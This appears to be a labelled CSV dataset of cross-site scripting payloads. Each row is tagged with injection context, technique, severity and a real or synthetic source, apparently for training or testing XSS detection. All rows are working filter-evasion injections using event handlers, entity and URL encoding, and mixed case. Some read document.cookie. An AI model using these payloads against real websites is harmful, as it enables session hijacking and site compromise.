payload,context,technique,severity,length,source
%3C% confirm(document.cookie) %%3E,template_injection,synthetic,high,34,synthetic
<script>//consol&#101;.log('XSS')</script>,script_injection,synthetic,low,42,synthetic
%27 ><svg onpointercancel=console.log(document.domain)>,attribute_escape,synthetic,medium,55,synthetic
<legend onpointerout=alert(1) style=display:block>AnonKryptiQuz</legend>,tag_injection,none,medium,72,real
<frame onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</frame>,tag_injection,none,medium,76,real
<meTa X=y onSecUriTypOliCyvIolAtiOn=ProMpt('XSS')>,tag_injection,synthetic,medium,50,synthetic
&quot; onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,low,88,synthetic
"<summary draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,72,real
"\"" onpointercancel=prompt(1)//",attribute_escape,synthetic,medium,30,synthetic
<td srC=x onWebKitAniMatIonEnd=prOmpT('XSS')>,tag_injection,synthetic,medium,45,synthetic
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",generic,encoding,high,57,real
"<div draggable=""true"" contenteditable>drag me</div><img2 ondrop=alert(1) contenteditable style=display:block>drop here</img2>",tag_injection,none,medium,125,real
<script>Function('\u0061lert(location.hash)')();</script>,script_injection,synthetic,low,57,synthetic
'><Img srC=x onTraNsiTioNstArt=coNfiRm(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,56,synthetic
"""`'><script>\xEF\xBB\xBFjavascript:alert(8282)</script>",script_injection,none,medium,55,real
' %3E%3Csvg oninput=console.log(document.domain)%3E,attribute_escape,synthetic,medium,51,synthetic
"""><img src=x oninv&#97;lid=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,68,synthetic
`><img src=x onpaste=console.log(1)>,attribute_escape,synthetic,medium,36,synthetic
<button popovertarget=x>Click me</button><iframe onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</iframe>,tag_injection,none,medium,108,real
